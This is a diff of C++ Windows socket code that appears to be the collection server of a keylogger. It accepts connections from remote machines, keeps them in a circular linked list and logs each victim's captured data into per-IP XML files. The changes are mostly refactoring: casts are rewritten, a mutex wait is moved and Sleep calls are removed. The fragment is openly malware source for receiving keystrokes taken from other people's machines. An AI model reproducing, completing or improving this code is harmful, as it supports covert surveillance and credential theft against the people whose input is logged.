@@ -14,7 +14,7 @@ void Listener()
     WSADATA WSA;
     SOCKET Listener;
     SOCKADDR_IN server, target;
-    head= (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
+    head= static_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
     (head->nextTarget)=0x00;
     (head->target)=0x00;
     SYSTEMTIME timestamp;
@@ -45,13 +45,13 @@ void Listener()
 
     listen(Listener,3);
     cL=sizeof(target);
-    SOCKETLIST link;
+    char* name;
     while(true)
     {
         fprintf(stderr, "accepted\n\t\t[*]Listening: ");
-        SOCKET *acceptedTarget = (SOCKET*)malloc(sizeof(SOCKET));
+        SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
-        SOCKETLIST *link = (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
+        SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
         if(*acceptedTarget==INVALID_SOCKET)
         {
             fprintf(stderr ,"\n\t\t[*] error connecting");
@@ -61,9 +61,10 @@ void Listener()
 
             fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
-
+            WaitForSingleObject(mu,INFINITE);
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
-            link->name = (char*)malloc(0xf0);
+            name = static_cast<char*>(malloc(0x100));
+            link->name = name;
             link->target = acceptedTarget;
             /*
                 if a file from the same ip is created at the same time then the naming convention
@@ -71,9 +72,7 @@ void Listener()
             */
             do
             {
-                Sleep(1);
                 GetSystemTime(&timestamp);
-                Sleep(1); 
                 sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
@@ -84,7 +83,7 @@ void Listener()
              WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                 strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
-            WaitForSingleObject(mu,INFINITE);
+
             /*
                 establish a self referential linked list,
                     A->B->C->A...
@@ -111,7 +110,7 @@ void Listener()
 void Handler()
 {
         unsigned int rcv;
-        char* buffer = (char*)malloc(0x1000);
+        char* buffer = static_cast<char *>(malloc(0x1000));
         SOCKETLIST *link;
         SOCKETLIST previousLink;
         while(1)
